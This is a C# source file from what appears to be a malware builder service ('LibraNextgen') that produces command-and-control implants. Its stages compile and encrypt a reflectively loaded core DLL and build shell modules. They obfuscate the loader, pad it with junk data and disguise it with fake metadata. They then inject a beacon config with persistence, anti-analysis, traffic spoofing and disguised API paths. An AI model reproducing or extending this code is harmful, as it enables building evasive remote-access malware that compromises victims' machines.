using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Models;

namespace LibraNextgen.Service.Services;

/// <summary>Per-build mutable state shared across stages.</summary>
internal class BuildContext
{
    public string BuildId { get; set; } = "";
    public BuildConfigRequest Req { get; set; } = null!;
    public string TempDir { get; set; } = "";
    public string TargetDir { get; set; } = "";
    public string FinalDir { get; set; } = "";
    public string TargetTriple { get; set; } = "";
    public string TargetOs { get; set; } = "";
    public string ReleaseDir { get; set; } = "";
    public string ModuleExt { get; set; } = "dll";
    public bool IsWindows { get; set; }
    public bool IsMacos { get; set; }
    public bool IsCross { get; set; }
    public bool SkipCompile { get; set; }
    public bool ForceRebuild { get; set; }
    public string ModulesDir { get; set; } = "";
    public Dictionary<string, string> EnvVars { get; set; } = new();
    public string CoreDllPath { get; set; } = "";
    public string ExePath { get; set; } = "";
    public string FinalPath { get; set; } = "";
    public byte[] EncryptedCore { get; set; } = [];
    public byte[] AesKey { get; set; } = [];
}

public partial class BuilderBuildService
{
    // ══════════════════════════════════════════════════════════════════
    // Stage 1: Build Core DLL from source
    // ══════════════════════════════════════════════════════════════════

    private static async Task Stage1_BuildCoreAsync(BuildContext ctx, string targetArg, BuildJob job)
    {
        job.Log($"=== Stage 1: Building Core DLL ({ctx.TargetTriple}) ===");
        var coreBuildArgs = BuilderBuildService.CargoBuildCommand(ctx, targetArg, "-p core");
        job.Log($"{(ctx.IsCross ? "cargo-zigbuild" : "cargo")}{coreBuildArgs}");

        var coreBuildResult = await RunProcessAsync(BuilderBuildService.CargoExe(ctx), coreBuildArgs, job, RustAgentDir, ctx.EnvVars);
        if (coreBuildResult.ExitCode != 0)
        {
            job.Fail($"Core build failed (exit code {coreBuildResult.ExitCode})");
            UpdateHistory(job);
            return;
        }

        var coreDllName = ctx.IsWindows ? "core.dll" : ctx.IsMacos ? "libcore.dylib" : "libcore.so";
        var coreDllPath = Path.Combine(ctx.ReleaseDir, coreDllName);
        if (!System.IO.File.Exists(coreDllPath))
        {
            var found = Directory.GetFiles(ctx.ReleaseDir, "*core*")
                .FirstOrDefault(f => f.EndsWith(".dll") || f.EndsWith(".so") || f.EndsWith(".dylib"));
            if (found != null) coreDllPath = found;
        }

        if (!System.IO.File.Exists(coreDllPath))
        {
            job.Fail($"Core DLL not found at {ctx.ReleaseDir}");
            UpdateHistory(job);
            return;
        }

        ctx.CoreDllPath = coreDllPath;
        job.Log($"Core DLL ready ({new FileInfo(coreDllPath).Length / 1024} KB)");
    }

    // ══════════════════════════════════════════════════════════════════
    // Stage 1.5: Validate core for reflective loading (PE/Windows only)
    // ══════════════════════════════════════════════════════════════════

    private static async Task Stage1_5_ValidateSrdiAsync(BuildContext ctx, BuildJob job)
    {
        if (!ctx.IsWindows) return;

        job.Log("=== Stage 1.5: Validating Core DLL for reflective loading ===");
        var srdiArgs = $"run --release -p srdi --target-dir \"{ctx.TargetDir}\" -- \"{ctx.CoreDllPath}\" core_main";
        var srdiResult = await RunProcessAsync("cargo", srdiArgs, job, RustAgentDir, ctx.EnvVars);
        if (srdiResult.ExitCode != 0)
        {
            job.Fail("Core DLL validation failed — 'core_main' export not found or DLL is invalid");
            UpdateHistory(job);
            return;
        }
        job.Log("Core DLL validated: PE structure OK, 'core_main' export present");
    }

    // ══════════════════════════════════════════════════════════════════
    // Stage 1.6: Build cloud modules for this platform
    // ══════════════════════════════════════════════════════════════════

    private static async Task Stage1_6_BuildModuleAsync(BuildContext ctx, string targetArg, BuildJob job)
    {
        job.Log($"=== Stage 1.6: Building cloud modules ({ctx.TargetTriple}) ===");

        // 按构建配置的启用列表过滤（null/空 = 全部）
        var enabled = BuilderBuildService.EnabledModuleList(ctx);
        var enabledSet = new HashSet<string>(enabled);
        var targets = BuilderBuildService.CloudModules
            .Where(m => enabledSet.Contains(m.Module))
            .ToList();

        // 禁用/启用状态 = 文件名后缀：禁用 → {name}.{ext}.disable（保留，可恢复）；
        // 启用 → 恢复为 {name}.{ext}。agent 请求原文件名，禁用后自然 404。
        if (Directory.Exists(ctx.ModulesDir))
        {
            foreach (var (moduleName, _) in BuilderBuildService.CloudModules)
            {
                var normal = Path.Combine(ctx.ModulesDir, $"{moduleName}.{ctx.ModuleExt}");
                var disabled = Path.Combine(ctx.ModulesDir, $"{moduleName}.{ctx.ModuleExt}.disable");
                if (enabledSet.Contains(moduleName))
                {
                    if (!System.IO.File.Exists(normal) && System.IO.File.Exists(disabled))
                    {
                        System.IO.File.Move(disabled, normal);
                        job.Log($"Re-enabled module {moduleName}.{ctx.ModuleExt}");
                    }
                }
                else if (System.IO.File.Exists(normal))
                {
                    System.IO.File.Move(normal, disabled);
                    job.Log($"Disabled module {moduleName}.{ctx.ModuleExt} -> {moduleName}.{ctx.ModuleExt}.disable");
                }
            }
        }

        var packages = string.Join(" ", targets
            .Select(m => m.Lib.StartsWith("shell_") ? "-p shell-module" : $"-p {m.Module}-module")
            .Distinct());

        var moduleBuildArgs = BuilderBuildService.CargoBuildCommand(ctx, targetArg, packages);
        var moduleBuildResult = await RunProcessAsync(BuilderBuildService.CargoExe(ctx), moduleBuildArgs, job, RustAgentDir, ctx.EnvVars);
        if (moduleBuildResult.ExitCode != 0)
        {
            job.Log("[WARN] cloud module build failed — cloud modules unavailable");
            return;
        }

        Directory.CreateDirectory(ctx.ModulesDir);
        var deployed = 0;
        foreach (var (moduleName, libName) in targets)
        {
            var artifact = ctx.IsWindows
                ? $"{libName}.dll"
                : ctx.IsMacos
                    ? $"lib{libName}.dylib"
                    : $"lib{libName}.so";
            var modulePath = Path.Combine(ctx.ReleaseDir, artifact);
            if (!System.IO.File.Exists(modulePath))
            {
                var found = Directory.GetFiles(ctx.ReleaseDir, $"*{libName}*")
                    .FirstOrDefault(f => f.EndsWith(".dll") || f.EndsWith(".so") || f.EndsWith(".dylib"));
                if (found != null) modulePath = found;
            }
            if (System.IO.File.Exists(modulePath))
            {
                System.IO.File.Copy(modulePath, Path.Combine(ctx.ModulesDir, $"{moduleName}.{ctx.ModuleExt}"), true);
                job.Log($"Deployed {moduleName}.{ctx.ModuleExt}");
                deployed++;
            }
            else
            {
                job.Log($"[WARN] {moduleName} module binary not found after build");
            }
        }
        job.Log($"Cloud modules deployed: {deployed}/{targets.Count} -> {ctx.ModulesDir}");
    }

    // ══════════════════════════════════════════════════════════════════
    // Stage 2: Encrypt Core DLL
    // ══════════════════════════════════════════════════════════════════

    private static async Task Stage2_EncryptCoreAsync(BuildContext ctx, BuildJob job)
    {
        job.Log("=== Stage 2: Encrypting Core DLL ===");

        if (ctx.SkipCompile)
        {
            // Prebuilt artifacts: reuse the cached core.bin and its key.
            var binPath = Path.Combine(ctx.TempDir, "core.bin");
            var keyPath = Path.Combine(ctx.TempDir, "core.key");
            ctx.EncryptedCore = await System.IO.File.ReadAllBytesAsync(binPath);
            ctx.AesKey = await System.IO.File.ReadAllBytesAsync(keyPath);
            job.Log($"Reusing cached core.bin ({ctx.EncryptedCore.Length / 1024} KB)");
            return;
        }

        var coreDllBytes = await System.IO.File.ReadAllBytesAsync(ctx.CoreDllPath);

        // Generate AES-256 key
        var aesKey = RandomNumberGenerator.GetBytes(32);

        // AES-256-GCM encrypt the core DLL
        var aesNonce = RandomNumberGenerator.GetBytes(12);
        using var aes = new AesGcm(aesKey, 16);
        var ciphertext = new byte[coreDllBytes.Length];
        var tag = new byte[16];
        aes.Encrypt(aesNonce, coreDllBytes, ciphertext, tag);

        // Combine: nonce(12) || ciphertext || tag(16)
        var encryptedCore = new byte[aesNonce.Length + ciphertext.Length + tag.Length];
        Buffer.BlockCopy(aesNonce, 0, encryptedCore, 0, aesNonce.Length);
        Buffer.BlockCopy(ciphertext, 0, encryptedCore, aesNonce.Length, ciphertext.Length);
        Buffer.BlockCopy(tag, 0, encryptedCore, aesNonce.Length + ciphertext.Length, tag.Length);

        // Save encrypted core
        var coreBinPath = Path.Combine(ctx.TempDir, "core.bin");
        await System.IO.File.WriteAllBytesAsync(coreBinPath, encryptedCore);
        job.Log($"Encrypted core saved: {encryptedCore.Length / 1024} KB");

        // The AES key is kept server-side (written next to the build output).
        // The loader negotiates it at runtime via /api/beacon/core-key, so no
        // RSA private key is embedded in the agent binary.
        Directory.CreateDirectory(ctx.FinalDir);
        await System.IO.File.WriteAllBytesAsync(Path.Combine(ctx.FinalDir, "core.key"), aesKey);
        job.Log("Core AES key written server-side");

        ctx.EncryptedCore = encryptedCore;
        ctx.AesKey = aesKey;
    }

    // ══════════════════════════════════════════════════════════════════
    // Stage 3: Get Loader (from template or build fresh)
    // ══════════════════════════════════════════════════════════════════

    private static async Task Stage3_PrepareLoaderAsync(BuildContext ctx, string targetArg, string featuresArg, BuildJob job)
    {
        job.Log("=== Stage 3: Preparing Loader ===");

        var loaderExeName = ctx.IsWindows ? "loader.exe" : "loader";
        var templatePlatformDir = Path.Combine(TemplateDir, $"{ctx.Req.Platform}-{ctx.Req.ApplicationType.ToLower()}");
        var templatePath = Path.Combine(templatePlatformDir, loaderExeName);
        var exePath = Path.Combine(ctx.TempDir, loaderExeName);

        if (System.IO.File.Exists(templatePath))
        {
            // ── Use cached template ──
            job.Log($"Using cached loader template: {templatePath}");
            System.IO.File.Copy(templatePath, exePath, true);
        }
        else
        {
            // ── First time: compile loader and save as template ──
            job.Log("No template found, compiling loader from source...");
            var loaderBuildArgs = BuilderBuildService.CargoBuildCommand(ctx, targetArg, $"{featuresArg} -p loader");
            job.Log($"{(ctx.IsCross ? "cargo-zigbuild" : "cargo")}{loaderBuildArgs}");

            var loaderBuildResult = await RunProcessAsync(BuilderBuildService.CargoExe(ctx), loaderBuildArgs, job, RustAgentDir, ctx.EnvVars);
            if (loaderBuildResult.ExitCode != 0)
            {
                job.Fail($"Loader build failed (exit code {loaderBuildResult.ExitCode})");
                UpdateHistory(job);
                return;
            }

            var compiledLoader = Path.Combine(ctx.ReleaseDir, loaderExeName);
            if (!System.IO.File.Exists(compiledLoader))
            {
                var found = Directory.GetFiles(ctx.ReleaseDir, "*")
                    .FirstOrDefault(f => Path.GetFileName(f) == "loader" || Path.GetFileName(f) == "loader.exe");
                if (found != null) compiledLoader = found;
            }

            if (!System.IO.File.Exists(compiledLoader))
            {
                job.Fail($"Loader binary not found at {ctx.ReleaseDir}");
                UpdateHistory(job);
                return;
            }

            // Save as template for future builds
            Directory.CreateDirectory(templatePlatformDir);
            System.IO.File.Copy(compiledLoader, templatePath, true);
            job.Log($"Loader template saved: {templatePath}");

            // Copy to build directory
            System.IO.File.Copy(compiledLoader, exePath, true);
        }

        job.Log($"Loader ready: {new FileInfo(exePath).Length / 1024} KB");
        ctx.ExePath = exePath;

        // ── Icon & metadata embedding via managed PE writer (Windows PE only) ──
        if (ctx.IsWindows && HasIconOrMetadata(ctx.Req))
        {
            await EmbedIconAndMetadata(ctx.Req, exePath, job);
        }

        // ── Goldberg obfuscation (Windows PE only) ──
        if (ctx.IsWindows && ctx.Req.EnableObfuscation)
        {
            job.Log("Running goldberg obfuscation...");
            try
            {
                var goldbergResult = await RunProcessAsync("goldberg", $"obfuscate \"{exePath}\"", job);
                if (goldbergResult.ExitCode == 0)
                    job.Log("Goldberg obfuscation completed.");
                else
                    job.Log($"[WARN] goldberg failed (exit {goldbergResult.ExitCode}), continuing without obfuscation.");
            }
            catch (Exception ex)
            {
                job.Log($"[WARN] goldberg not available: {ex.Message}");
            }
        }

        // ── Junk data injection ──
        if (ctx.Req.InjectJunkData && ctx.Req.JunkDataMb > 0)
        {
            job.Log($"Injecting {ctx.Req.JunkDataMb} MB junk data...");
            var junk = RandomNumberGenerator.GetBytes(ctx.Req.JunkDataMb * 1024 * 1024);
            await using var fs = System.IO.File.Open(exePath, FileMode.Append);
            await fs.WriteAsync(junk);
        }
    }

    // ══════════════════════════════════════════════════════════════════
    // Stage 4: Inject Config into Loader (MUST be last — after obfuscation/junk)
    // ══════════════════════════════════════════════════════════════════

    private async Task Stage4_InjectConfigAsync(BuildContext ctx, BuildJob job)
    {
        job.Log("=== Stage 4: Injecting Config ===");
        var req = ctx.Req;
        var host = req.ServerHost;
        var protocol = "http";
        if (host.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            { protocol = "https"; host = host[8..]; }
        else if (host.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
            { host = host[7..]; }
        var serverUrl = $"{protocol}://{host}:{req.ServerPort}";
        var injectedConfig = new InjectedConfig
        {
            server_url = serverUrl,
            register_path = "/api/beacon/register",
            heartbeat_path = "/api/beacon/heartbeat",
            result_path = "/api/beacon/result",
            ws_path = "/ws/agent",
            heartbeat_interval_ms = 3000,
            jitter_percent = 0.2,
            require_admin = req.RequireAdmin,
            copy_to_path = req.CopyToAppData ? "sys64" : null,
            enable_persistence = req.EnablePersistence,
            core_download_path = $"/api/v1/models/{ctx.BuildId}",
            core_key_path = "/api/v1/auth/token",
            beacon_secret = _beaconSettings.Secret,
            anti_analysis = req.AntiAnalysis,
            // 流量伪装（构建页面编辑注入；注册后服务端 profile 可覆盖）
            user_agents = req.UserAgents ?? new(),
            extra_headers = req.ExtraHeaders ?? new(),
            path_suffixes = req.PathSuffixes ?? new(),
            // 服务端 RSA 公钥：注册/密钥协商混合加密
            server_public_key = _serverKeys.PublicKeyDerBase64,
        };

        var configJson = JsonSerializer.Serialize(injectedConfig);
        var configBytes = Encoding.UTF8.GetBytes(configJson);
        var magicBytes = Encoding.UTF8.GetBytes("LIBRA_CFG_BLOCK!");

        await using (var fs = System.IO.File.Open(ctx.ExePath, FileMode.Append))
        {
            await fs.WriteAsync(magicBytes);
            var lenBytes = BitConverter.GetBytes((uint)configBytes.Length);
            await fs.WriteAsync(lenBytes);
            await fs.WriteAsync(configBytes);
        }

        job.Log($"Config injected: {configJson.Length} bytes");

        // ── Move to final output ──
        ctx.FinalPath = Path.Combine(ctx.FinalDir, job.Record.FileName);
        var finalCorePath = Path.Combine(ctx.FinalDir, "core.bin");

        // Write core.bin via system temp + move (avoids Defender directory scan lock)
        job.Log("Writing core.bin...");
        var tempCorePath = Path.Combine(Path.GetTempPath(), $"libra_{ctx.BuildId}.bin");
        await System.IO.File.WriteAllBytesAsync(tempCorePath, ctx.EncryptedCore);
        System.IO.File.Move(tempCorePath, finalCorePath, true);
        job.Log($"core.bin written: {ctx.EncryptedCore.Length / 1024} KB");

        // Copy loader
        job.Log("Copying loader...");
        System.IO.File.Copy(ctx.ExePath, ctx.FinalPath, true);

        var fileInfo = new FileInfo(ctx.FinalPath);
        job.Complete(fileInfo.Length);
        job.Log($"Build complete: {ctx.FinalPath} ({fileInfo.Length / 1024} KB), core.bin ({ctx.EncryptedCore.Length / 1024} KB)");
    }

    // ── Helpers ────────────────────────────────────────────────────────

    private static bool HasIconOrMetadata(BuildConfigRequest req)
    {
        return !string.IsNullOrEmpty(req.IconUrl) ||
               !string.IsNullOrEmpty(req.CompanyName) ||
               !string.IsNullOrEmpty(req.FileDescription) ||
               !string.IsNullOrEmpty(req.ProductName) ||
               !string.IsNullOrEmpty(req.Copyright) ||
               !string.IsNullOrEmpty(req.FileVersion);
    }

    private static async Task EmbedIconAndMetadata(BuildConfigRequest req, string exePath, BuildJob job)
    {
        job.Log("Embedding icon/metadata (managed PE writer)...");

        // Resolve icon bytes
        byte[]? iconBytes = null;
        if (!string.IsNullOrEmpty(req.IconUrl))
        {
            try
            {
                if (System.IO.File.Exists(req.IconUrl))
                {
                    iconBytes = await System.IO.File.ReadAllBytesAsync(req.IconUrl);
                }
                else if (req.IconUrl.StartsWith("http"))
                {
                    using var http = new HttpClient();
                    iconBytes = await http.GetByteArrayAsync(req.IconUrl);
                }
            }
            catch { job.Log("[WARN] Icon load failed, skipping icon."); }
        }

        var metadata = new LibraNextgen.Common.Pe.PeMetadata
        {
            CompanyName = req.CompanyName,
            FileDescription = req.FileDescription,
            ProductName = req.ProductName,
            FileVersion = req.FileVersion,
            ProductVersion = req.FileVersion,
            Copyright = req.Copyright,
            Icon = iconBytes,
        };

        try
        {
            var exeBytes = await System.IO.File.ReadAllBytesAsync(exePath);
            var patched = LibraNextgen.Common.Pe.PeResourceWriter.Embed(exeBytes, metadata);
            await System.IO.File.WriteAllBytesAsync(exePath, patched);
            job.Log("Icon/metadata embedded successfully.");
        }
        catch (Exception ex)
        {
            job.Log($"[WARN] metadata embedding failed: {ex.Message}. Continuing without icon/metadata.");
        }
    }
}
